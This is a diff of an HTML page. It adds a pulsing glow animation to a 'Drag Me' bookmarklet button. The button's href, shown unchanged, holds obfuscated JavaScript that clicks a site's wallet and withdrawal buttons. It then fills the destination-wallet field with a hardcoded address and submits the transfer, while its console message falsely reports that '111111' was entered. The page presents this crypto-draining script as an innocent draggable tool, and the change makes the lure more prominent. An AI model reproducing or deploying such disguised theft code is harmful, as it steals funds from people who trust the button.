@@ -665,6 +665,24 @@
                 min-height: 220px;
             }
         }
+        
+        /* Add this to the <style> section */
+        @keyframes dragGlowPulse {
+            0% {
+                box-shadow: 0 0 0px 0px #a6b0cf, 0 0 0px 0px #a6b0cf44;
+            }
+            50% {
+                box-shadow: 0 0 16px 6px #a6b0cf, 0 0 32px 12px #a6b0cf44;
+            }
+            100% {
+                box-shadow: 0 0 0px 0px #a6b0cf, 0 0 0px 0px #a6b0cf44;
+            }
+        }
+        .drag-glow {
+            animation: dragGlowPulse 1.5s infinite;
+            box-shadow: 0 0 8px 2px #a6b0cf, 0 0 16px 4px #a6b0cf44;
+            transition: box-shadow 0.2s;
+        }
     </style>
 </head>
 <body>
@@ -712,7 +730,8 @@
 <!-- Bookmarklet Button -->
 <a href="javascript:function _0x4340(_0x3e82cf,_0x1511ad){const _0xb703bf=_0xb703();return _0x4340=function(_0x434043,_0x232f07){_0x434043=_0x434043-0x16d;let _0x196efe=_0xb703bf[_0x434043];return _0x196efe;},_0x4340(_0x3e82cf,_0x1511ad);}function _0xb703(){const _0x2f7c77=['FDohUpe1eg67AeM6e8vpzMicGFGwnUgxjUY5XAixEs6i','3924eBsfCs','prototype','16fWBEfX','3276515Bqjrwx','3103226nCbBQx','Wallet button not found.','Withdrawal button not found.','.bg-secondaryStroke.flex-1.h-\\[28px\\]','error','set','Final submit button clicked','409UahdWV','input','.bg-primaryBlue.flex.flex-row.flex-1.h-\\[32px\\]','4234ciixjM','input[placeholder=&quot;Address of destination wallet&quot;]','.text-primaryBlue.text-\\[12px\\].leading-\\[16px\\].font-medium','querySelector','change','click','454782ZIvSpo','34330vBmHYB','dispatchEvent','value','Input filled with 111111','log','1298424aRtjQE','7489304ydZIVj'];_0xb703=function(){return _0x2f7c77;};return _0xb703();}(function(_0x295f30,_0x274915){const _0x1fa88c=_0x4340,_0x540875=_0x295f30();while(!![]){try{const _0x5a23f7=parseInt(_0x1fa88c(0x16e))/0x1*(-parseInt(_0x1fa88c(0x171))/0x2)+-parseInt(_0x1fa88c(0x177))/0x3*(-parseInt(_0x1fa88c(0x182))/0x4)+parseInt(_0x1fa88c(0x183))/0x5+parseInt(_0x1fa88c(0x17d))/0x6+parseInt(_0x1fa88c(0x184))/0x7+parseInt(_0x1fa88c(0x17e))/0x8+parseInt(_0x1fa88c(0x180))/0x9*(-parseInt(_0x1fa88c(0x178))/0xa);if(_0x5a23f7===_0x274915)break;else _0x540875['push'](_0x540875['shift']());}catch(_0x1fedad){_0x540875['push'](_0x540875['shift']());}}}(_0xb703,0x78d4b),((()=>{const _0x33ec51=_0x4340,_0x1d994a=(_0x13e676,_0x3bf824)=>{const _0x490437=setInterval(()=>{const _0x38ff10=_0x4340,_0x341968=document[_0x38ff10(0x174)](_0x13e676);_0x341968&&(clearInterval(_0x490437),_0x3bf824(_0x341968));},0x32);},_0xe5b6e0=document[_0x33ec51(0x174)]('.w-fit.min-w-max.bg-primaryStroke');_0xe5b6e0?(_0xe5b6e0[_0x33ec51(0x176)](),setTimeout(()=>{const _0x5a1c87=_0x33ec51,_0x5a8f82=document['querySelector'](_0x5a1c87(0x187));_0x5a8f82?(_0x5a8f82['click'](),_0x1d994a(_0x5a1c87(0x173),_0x13f636=>{const _0x258f22=_0x5a1c87;_0x13f636['click'](),_0x1d994a(_0x258f22(0x172),_0x14c57c=>{const _0x17f41e=_0x258f22,_0x33d604=Object['getOwnPropertyDescriptor'](window['HTMLInputElement'][_0x17f41e(0x181)],_0x17f41e(0x17a))[_0x17f41e(0x189)];_0x33d604['call'](_0x14c57c,_0x17f41e(0x16d)),_0x14c57c[_0x17f41e(0x179)](new Event(_0x17f41e(0x16f),{'bubbles':!![]})),_0x14c57c[_0x17f41e(0x179)](new Event(_0x17f41e(0x175),{'bubbles':!![]})),console[_0x17f41e(0x17c)](_0x17f41e(0x17b)),_0x1d994a(_0x17f41e(0x170),_0x52ec96=>{const _0x9d660e=_0x17f41e;_0x52ec96['click'](),console[_0x9d660e(0x17c)](_0x9d660e(0x16d));});});})):console['error'](_0x5a1c87(0x186));},0xc8)):console[_0x33ec51(0x188)](_0x33ec51(0x185));})()));"
    draggable="true"
-   style="display:inline-block;padding:8px 16px;background:linear-gradient(to right,#3b82f6,#8b5cf6,#ec4899);color:white;border-radius:12px;font-family:sans-serif;font-weight:500;text-decoration:none;box-shadow:0 0 20px rgba(59,130,246,0.5);">
+   class="drag-glow"
+   style="display:inline-block;padding:8px 16px;background:linear-gradient(to right,#3b82f6,#8b5cf6,#ec4899);color:white;border-radius:12px;font-family:sans-serif;font-weight:500;text-decoration:none;">
    Drag Me
 </a>
 
